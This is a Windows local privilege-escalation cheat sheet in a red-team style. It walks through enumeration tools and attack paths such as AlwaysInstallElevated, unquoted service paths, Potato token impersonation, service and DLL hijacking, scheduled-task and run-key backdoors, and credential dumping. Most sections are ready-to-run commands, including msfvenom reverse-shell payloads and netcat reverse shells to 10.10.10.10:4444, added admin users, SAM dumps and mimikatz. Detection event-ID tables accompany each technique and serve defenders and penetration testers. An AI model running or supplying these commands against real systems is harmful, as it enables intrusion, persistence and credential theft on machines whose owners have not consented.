# Local Windows Privilege Escalation

## Overview

Before escalating within the domain, you must first have local administrator or SYSTEM access on at least one domain-joined host. These techniques cover elevating from a limited user to Administrator/SYSTEM on a Windows machine. Run all enumeration tools first, then select the appropriate exploit path.

## Enumeration Tools

### WinPEAS (Windows Privilege Escalation Awesome Scripts)

```powershell
# Run all checks
winpeas.exe

# Specific checks
winpeas.exe systeminfo
winpeas.exe servicesinfo
winpeas.exe applicationsinfo
winpeas.exe windowscreds
winpeas.exe browserinfo
winpeas.exe filesinfo
winpeas.exe eventsinfo

# Output to file
winpeas.exe > winpeas_output.txt

# Run from network share (if AV present)
\\10.10.10.10\tools\winpeas.exe

# Run with specific colors for better terminal readability
winpeas.exe color

# Not colors
winpeas.exe nocolor

# Wait for user input between checks
winpeas.exe wait

# Fast mode (skip slow checks)
winpeas.exe fast
```

### SeatBelt (GhostPack)

```powershell
# Basic usage - all checks
SeatBelt.exe -group=all

# Specific check groups
SeatBelt.exe -group=user
SeatBelt.exe -group=system
SeatBelt.exe -group=remote
SeatBelt.exe -group=misc
SeatBelt.exe -group=slack

# Individual checks
SeatBelt.exe -command=ModifiableServices
SeatBelt.exe -command=UnquotedServices
SeatBelt.exe -command=AlwaysInstallElevated

# Output to file
SeatBelt.exe -group=all -outputfile=seatbelt.txt

# JSON output
SeatBelt.exe -group=all -outputfile=seatbelt.json -json

# Full command list
SeatBelt.exe -full

# Interesting commands
SeatBelt.exe -command=InterestingFiles -filter="*.kdbx;*.key"
SeatBelt.exe -command=InterestingProcesses
SeatBelt.exe -command=WindowsAutoLogon
SeatBelt.exe -command=CredEnum
SeatBelt.exe -command=EventLogs
SeatBelt.exe -command=InstalledApps
SeatBelt.exe -command=NonstandardServices
SeatBelt.exe -command=PowerShellHistory
SeatBelt.exe -command=PuttySessions
SeatBelt.exe -command=RecentFiles
SeatBelt.exe -command=RecycleBin
SeatBelt.exe -command=RegAutoLogon
SeatBelt.exe -command=ScheduledTasks
SeatBelt.exe -command=UserFolders
SeatBelt.exe -command=UserProfiles
SeatBelt.exe -command=WSUS
```

### PowerUp.ps1

```powershell
# Load into memory (bypass execution policy)
powershell -ep bypass
. .\PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Specific abuse functions
Invoke-AllChecks -HTMLReport
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail
Get-UnquotedService
Get-ModifiableScheduledTask
Get-ModifiableRegistryAutoRun
Get-UserHiveFiles
Get-VulnerableServiceName
Get-PathHijackable

# AlwaysInstallElevated check
Get-RegistryAlwaysInstallElevated
Write-UserAddMSI
```

### SharpUp

```powershell
# Run all checks
SharpUp.exe

# Specific checks
SharpUp.exe audit

# Only output vulnerabilities
SharpUp.exe audit > vulns.txt
```

## 1. AlwaysInstallElevated

### Prerequisites
- Registry keys exist: `HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1`
- Registry keys exist: `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1`
- Both keys must be set to 1

### Detection
```powershell
# Check registry manually
reg query HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# GPO setting
Computer Configuration > Administrative Templates > Windows Components > Windows Installer > Always install with elevated privileges
```

### Exploitation
```powershell
# PowerUp - Generate and run malicious MSI
Write-UserAddMSI

# The above creates UserAdd.msi and executes it
# This adds a new local admin user

# Manual MSI creation with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o service.msi
msiexec /quiet /qn /i service.msi

# Msfvenom add user MSI
msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd123 -f msi -o adduser.msi
msiexec /quiet /qn /i adduser.msi
```

### OPSEC
- **Loud**: Creating users triggers 4720 (user created) and 4732 (added to group) event IDs
- **MSI install**: Event ID 1033 (MSI install), 1034 (MSI uninstall), 11707 (install success)
- **Registry queries**: May trigger Sysmon EID 1 or 12-14

### Detection
| Event ID | Description |
|----------|-------------|
| 4663 | Registry access |
| 4688 | MSIExec process creation |
| 4720 | User account created |
| 4732 | User added to security group |
| 1033 | Windows Installer installed application |

## 2. Unquoted Service Paths

### Prerequisites
- Service binary path has spaces and no quotes
- Attacker has write permissions to a directory in the unquoted path
- Service runs as SYSTEM (usually)

### Enumeration
```powershell
# PowerView
Get-ServiceUnquoted

# PowerUp
Get-UnquotedService

# SeatBelt
SeatBelt.exe -command=UnquotedServices

# Manual with wmic
wmic service get name,displayname,pathname,startname | findstr /i /v "C:\Windows" | findstr /i /v """

# Manual with sc
sc query state=all | findstr "SERVICE_NAME" > services.txt
for /f "tokens=2 delims= " %a in (services.txt) do @sc qc %a | findstr "BINARY_PATH_NAME"

# PowerShell manual
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -notlike '"*"' -and $_.PathName -like '* *' }
```

### Exploitation

```powershell
# 1. Find the unquoted path (e.g., C:\Program Files\Vuln Service\service.exe)
# 2. Check write permissions on directories
icacls "C:\Program Files\Vuln Service"
# If you have (W) write on C:\Program Files\Vuln Service\ but not the parent...

# 3. Create a malicious executable in the path
# If service runs: C:\Program Files\My App\service.exe
# Create: C:\Program.exe or C:\Program Files\My.exe

# PowerUp - automatic exploitation
Invoke-ServiceAbuse -Name "VulnService" -Command "net localgroup Administrators user /add"

# Manually place payload
# Place payload as C:\Program.exe or C:\Program Files\My.exe
copy C:\tools\nc.exe "C:\Program Files\My App\My.exe"

# 4. Restart the service
sc stop VulnService
sc start VulnService

# Or if cannot restart, wait for reboot / system restart
```

### OPSEC
- **Service stop/start**: Generates Event ID 7036 (service state change)
- **Service binary replace**: Creates 4688 for new service process
- **sc commands**: Tracked by 4688 process creation
- **Cannot restart services** unless member of Administrators or service has specific permissions

### Detection
| Event ID | Description |
|----------|-------------|
| 4688 | Process creation of planted binary |
| 7036 | Service state change |
| 7045 | New service installed |
| 4697 | New service was installed (if security audit) |

## 3. Token Impersonation (Potato Family)

### Overview
The "Potato" family of exploits leverage SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to escalate to SYSTEM. When running as a service (IIS, SQL Server, MSSQL), the user typically has these privileges.

### Check for SeImpersonatePrivilege

```powershell
whoami /priv

# Look for:
# SeImpersonatePrivilege - Enabled
# SeAssignPrimaryTokenPrivilege - Enabled
```

### JuicyPotato (Windows 7/8/2008/2012)

```cmd
# Usage
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -a "/c whoami"

# Reverse shell
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -a "/c C:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe"

# With a specific CLSID (find CLSID for target OS)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -a "/c whoami" -c "{CLSID}"

# Using an existing COM object
JuicyPotato.exe -l 1337 -p C:\Users\Public\nc.exe -a "10.10.10.10 4444 -e cmd.exe" -c "{CLSID}" -z
```

### RoguePotato / RogueWinRM

```cmd
# RoguePotato (Windows 10 1809+ / Server 2019+)
RoguePotato.exe -r 10.10.10.10 -e "cmd.exe" -l 1337

# With specific version
RoguePotato.exe -r 10.10.10.10 -e "C:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 1337 -v

# RogueWinRM
RogueWinRM.exe -p "C:\tools\nc.exe" -a "10.10.10.10 4444 -e cmd.exe"
```

### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# Basic usage
PrintSpoofer.exe -c "cmd.exe"

# Reverse shell
PrintSpoofer.exe -c "C:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe"

# Interactive command
PrintSpoofer.exe -i -c powershell.exe

# With specific pipe name
PrintSpoofer.exe -c "cmd /c whoami" -p "my_pipe"

# Execute as specific session
PrintSpoofer.exe -c "cmd.exe" -s 2
```

### GodPotato / SharpEfsPotato / EfsPotato

```cmd
# GodPotato (Windows Server 2012-2022, Win 8-11)
GodPotato.exe -cmd "cmd /c whoami"

# With reverse shell
GodPotato.exe -cmd "C:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe"

# SharpEfsPotato
SharpefsPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "whoami"
```

### OPSEC
- Potatoes create named pipes and trigger DCOM connections — generates 4697 (new service) and 5156 (connection events)
- Network traffic to attacker machine (port forwarding) is observable
- Process tree anomalies: cmd/powershell spawned by unexpected parent process
- EDR/AV may flag Potato binaries by signature

### Detection
| Event ID | Description |
|----------|-------------|
| 4697 | Service install (DCOM activation) |
| 4672 | Special logon assigned (SeImpersonatePrivilege used) |
| 5156 | Windows Filtering Platform connection |
| 5158 | Named pipe creation |
| 4688 | Suspicious process spawn (cmd from spoolsv.exe, etc.) |
| Sysmon EID 1 | Process creation (anomalous parent) |

## 4. Modifiable Services / Service Binary Permissions

### Prerequisites
- Write access to a service binary path or the ability to change service configuration (`sc config`)
- Service runs as SYSTEM

### Enumeration
```powershell
# PowerUp
Get-ModifiableServiceFile
Get-ModifiableService

# SeatBelt
SeatBelt.exe -command=ModifiableServices
SeatBelt.exe -command=ModifiableServiceFiles

# Manual with icacls
icacls "C:\Program Files\SomeService\service.exe"
# Look for BUILTIN\Users:(F) or BUILTIN\Users:(W)

# Manual with sc and accesschk
sc query
sc qc ServiceName

# Check service permissions with accesschk (Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
accesschk.exe -uwcqv "Everyone" *

# PowerShell check
Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -like "*SYSTEM*" }
```

### Exploitation

#### Method 1: Replace Service Binary

```cmd
# Stop service
sc stop VulnService

# Replace binary
copy C:\tools\malicious.exe "C:\Program Files\VulnService\service.exe"

# Start service
sc start VulnService

# With PowerUp
Invoke-ServiceAbuse -Name VulnService -Command "net localgroup Administrators user /add"
```

#### Method 2: Change Service Binary Path

```cmd
# Check if you have SERVICE_CHANGE_CONFIG permission
sc config VulnService binPath= "C:\tools\malicious.exe"
sc stop VulnService
sc start VulnService

# Add user
sc config VulnService binPath= "net localgroup Administrators user /add"
sc stop VulnService
sc start VulnService

# Restore binary path
sc config VulnService binPath= "C:\Program Files\VulnService\original.exe"
```

### OPSEC
- Service config changes: Event ID 7045 (service install)
- Binary replacement: file modification time changes
- Service stop/start: Event ID 7036
- Process creation: Event ID 4688 (malicious binary)

### Detection
| Event ID | Description |
|----------|-------------|
| 7045 | New service installed (binPath changed) |
| 7036 | Service state change |
| 4688 | Process creation from replaced binary |
| 4657 | Registry value modified (service config) |

## 5. DLL Hijacking

### Prerequisites
- A service/application loads a DLL from a path the user can write to
- Missing DLL in a search path (System32, app directory, PATH, CWD)

### Identification

```powershell
# Use Process Monitor (procmon) to find missing DLLs
# Filter: Result ends with "NAME NOT FOUND" or "PATH NOT FOUND"
# Filter: Path ends with ".dll"

# PowerUp - check for hijackable paths
Get-PathHijackable

# Manual - check PATH with write permissions
echo %PATH%
icacls C:\Some\Path (writeable by Users)

# Common hijackable DLLs
wlbsctrl.dll - for Windows NLB
CRYPTSP.dll - for various services
UXTheme.dll - for various services
```

### Exploitation

```powershell
# 1. Find missing DLL via procmon or known techniques
# 2. Generate malicious DLL (reverse shell, add user, etc.)
# 3. Place DLL in writable path where application loads from

# msfvenom DLL generation
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o malicious.dll

# Using SharpDLLHijack
SharpDLLHijack.exe -d "C:\Windows\System32\wlbsctrl.dll" -p "C:\path\to\payload.dll"

# Using PowerUp
Write-DLLHijacker -Command "net localgroup Administrators user /add" -OutputFile "C:\Path\to\missing.dll"
```

### OPSEC
- DLL load: Event ID 7036 or 4688 depending on what loads it
- DLL sideloading detection: Sysmon Event ID 7 (image load) from non-standard paths
- File creation: Sysmon Event ID 11
- Many EDRs flag unsigned DLLs loaded by signed processes

### Detection
| Event ID | Description |
|----------|-------------|
| Sysmon EID 7 | DLL loaded from non-standard path |
| Sysmon EID 11 | File creation (malicious DLL) |
| 4688 | Process start with hijacked DLL |
| 7036 | Service behavior change |

## 6. Named Pipe Abuse

### Overview
Named pipes can be used for privilege escalation by tricking a privileged process into writing to a pipe that an attacker controls. Tools like PowerUp and Meterpreter have built-in modules.

### Meterpreter Named Pipe Impersonation

```meterpreter
# In Meterpreter session
use incognito
list_tokens -u
named_pipe_impersonate -h
named_pipe_impersonate -s \\pipe\myPipe

# Loading incognito
load incognito
impersonate_token "NT AUTHORITY\SYSTEM"
```

### PowerUp Named Pipe

```powershell
# PowerUp function
Invoke-NamedPipeImpersonation -Command "net localgroup Administrators user /add"

# With specific pipe
Invoke-NamedPipeImpersonation -PipeName "testpipe" -Command "whoami"
```

### Cross-Process Named Pipe Impersonation

```powershell
# Create a named pipe and wait for a privileged process to connect
# When a SYSTEM process writes to the pipe, impersonate its token

# Using Meterpreter
meterpreter > use exploit/windows/local/named_pipe
```

### OPSEC
- Named pipe creation: Sysmon Event ID 17 (Pipe created), 18 (Pipe connected)
- Suspicious process connecting to attacker's pipe
- Impersonation: Event ID 4672 (special logon)

### Detection
| Event ID | Description |
|----------|-------------|
| Sysmon EID 17 | Named pipe created |
| Sysmon EID 18 | Named pipe connected |
| 4672 | Special logon after impersonation |
| 4688 | Suspicious process from impersonation |

## 7. Modifiable Scheduled Tasks

### Enumeration
```powershell
# List scheduled tasks
schtasks /query /fo LIST /v

# PowerUp
Get-ModifiableScheduledTask

# SeatBelt
SeatBelt.exe -command=ScheduledTasks

# Check permissions on task
icacls C:\Windows\Tasks\task_name
icacls C:\Windows\System32\Tasks\task_name

# PowerShell
Get-ScheduledTask | Get-ScheduledTaskInfo
```

### Exploitation
```powershell
# Modify task to run malicious command
schtasks /change /tn "TaskName" /tr "C:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe"
schtasks /run /tn "TaskName"

# If task is modifiable but not immediately triggerable, wait for trigger

# Create a new task that runs as SYSTEM
schtasks /create /tn "Privesc" /tr "C:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST
schtasks /run /tn "Privesc"
```

### OPSEC
- Task creation: Event ID 4698 (scheduled task created)
- Task modification: Event ID 4699 (scheduled task deleted), 4700 (enabled), 4701 (disabled), 4702 (updated)

### Detection
| Event ID | Description |
|----------|-------------|
| 4698 | Scheduled task created |
| 4702 | Scheduled task updated |
| 4688 | Process from task action |

## 8. Registry AutoRun / Startup Abuse

### Enumeration
```powershell
# Check writable registry run keys
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# PowerUp
Get-ModifiableRegistryAutoRun

# Check all startup programs
wmic startup get caption,command
```

### Exploitation
```powershell
# Add to startup with malicious command (need write access to key)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe"

# Require user logoff/logon or reboot

# Startup folder (less privileged)
copy C:\tools\malicious.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.exe"
```

### OPSEC
- Registry modification: Event ID 4657 (registry value modified)
- File creation in Startup: Sysmon EID 11

### Detection
| Event ID | Description |
|----------|-------------|
| 4657 | Registry modification |
| Sysmon EID 13 | Registry value set |
| Sysmon EID 11 | File created in Startup folder |

## 9. Credential Theft (Registry / Files)

### SAM Registry Hive

```cmd
# If running as LOCAL SERVICE or can read SAM/ SYSTEM hives
reg save hklm\sam sam.hive
reg save hklm\system system.hive

# Get hashes offline
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

### Stored Credentials

```powershell
# Cached credentials (mimikatz)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Windows Credential Manager
cmdkey /list

# Runas saved credentials
runas /savecred /user:DOMAIN\Administrator cmd.exe

# Check for stored creds in files
dir /s *.kdbx *.key *.p12 *.pfx *.cred 2>nul

# Unattended install files
dir /s unattend.xml
dir /s sysprep.xml
dir /s *autologon*
```

### OPSEC
- SAM dump: Event ID 4688 (reg.exe save), process creation alerts
- mimikatz: Heavily signatured by AV/EDR
- LSASS dump: Event ID 4688 with lsass.exe, Sysmon EID 10 (lsass access)

### Detection
| Event ID | Description |
|----------|-------------|
| 4688 | reg.exe / mimikatz / procdump execution |
| Sysmon EID 10 | LSASS process access |
| 4657 | Registry save |
| 4663 | File read (SAM/SYSTEM hive) |

## 10. Additional Local Escalation Vectors

### AlwaysInstallElevated
- See section above

### UAC Bypass (Local Admin → SYSTEM cannot bypass UAC without elevation)

```cmd
# Known UAC bypass techniques
# fodhelper.exe
# eventvwr.exe
# sdclt.exe
# ComputerDefaults.exe
%windir%\System32\fodhelper.exe

# UAC bypass with C# tool
SharpBypassUAC.exe -p cmd.exe -c "whoami"
```

### Named Pipe / Token Duplication

```cmd
# Token manipulation (if have SeDebugPrivilege)
# Winlogon PID often runs as SYSTEM
# Use Process Explorer to get PID

# Using PowerUp's Invoke-TokenManipulation
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# Using incognito (meterpreter)
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

### Group Policy Preference (GPP) Passwords
```cmd
# Older domain-joined machines may have cached GPP XML files
dir /s *.xml | findstr "cpassword"
# Found in SYSVOL accessible to authenticated users
\\domain\SYSVOL\domain\Policies\*\Machine\Preferences\Groups\Groups.xml
# Decrypt with gpp-decrypt
gpp-decrypt "cpassword_hash"
```

## OPSEC Summary

| Activity | Noise Level | Notes |
|----------|-------------|-------|
| WinPEAS execution | Medium | Many registry/process queries |
| SeatBelt execution | Medium | Similar to WinPEAS |
| Service stop/start | High | 7036 events logged |
| Service binary replace | High | File change + process spawn |
| Service config change | High | 7045 service installed |
| Potato execution | Medium | Named pipe + DCOM activation |
| DLL hijack | Low-Medium | Depends on what loads the DLL |
| Registry modification | Medium | 4657 events |
| Scheduled task abuse | High | 4698/4702 events |
| SAM dump | High | LSASS access alerts |
| MSI install (AlwaysInstallElevated) | Medium | MSI install events |

## Quick Reference

```powershell
# WinPEAS
winpeas.exe

# SeatBelt - all
SeatBelt.exe -group=all

# PowerUp - all checks
. .\PowerUp.ps1; Invoke-AllChecks

# Check privileges
whoami /priv

# Check service permissions
icacls "C:\Program Files\*"

# Full token impersonation attempt (PrintSpoofer)
PrintSpoofer.exe -c "cmd /c whoami"

# AlwaysInstallElevated attack via msiexec
msiexec /quiet /qn /i C:\tools\malicious.msi
```
